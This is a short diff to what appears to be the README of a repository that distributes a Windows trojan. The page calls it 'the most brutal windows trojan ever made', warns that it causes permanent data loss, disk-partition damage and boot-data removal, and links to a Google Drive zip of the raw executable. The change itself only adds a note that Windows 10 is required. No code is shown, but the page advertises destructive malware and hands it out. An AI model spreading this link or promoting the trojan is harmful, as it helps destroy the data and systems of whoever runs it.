@@ -3,6 +3,7 @@ The most brutal windows trojan ever made.
 
 
 ***>> PLEASE NOTE : This executable may cause serious harms on the system. (e.g. permanent data loss, disk-partition damage, boot-data removal etc.)***
+***>> PLEASE NOTE : Minimum Windows 10 required to function correctly***
 
 **::[+] Raw Executable (Zip) = https://drive.google.com/file/d/1h-j9eaNlcTo0F-A6weq0OxgydpZ933ed/view?usp=share_link**
 
